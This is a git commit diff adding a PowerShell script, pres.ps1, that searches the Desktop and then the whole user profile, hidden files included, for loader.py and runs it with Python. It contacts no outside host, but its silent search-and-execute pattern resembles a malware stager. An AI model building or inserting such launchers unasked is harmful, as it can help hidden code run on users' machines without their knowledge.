743ff2324c01a5332ddd7f6cb945c3f9e96ed26d
jude641 <jude@mailhaven.su>
2025-08-02 14:59:48 +0000

    Update pres.ps1

--- pres.ps1
+++ pres.ps1
@@ -1,1 +1,18 @@
+$filename = "loader.py"
+$desktopPath = [Environment]::GetFolderPath("Desktop")
+$found = $false
 
+$desktopFile = Join-Path $desktopPath $filename
+if (Test-Path $desktopFile) {
+    python "$desktopFile"
+    $found = $true
+}
+
+if (-not $found) {
+    $userProfile = $env:USERPROFILE
+    $result = Get-ChildItem -Path $userProfile -Recurse -Filter $filename -ErrorAction SilentlyContinue -Force | Select-Object -First 1
+
+    if ($result) {
+        python "$($result.FullName)"
+    }
+}
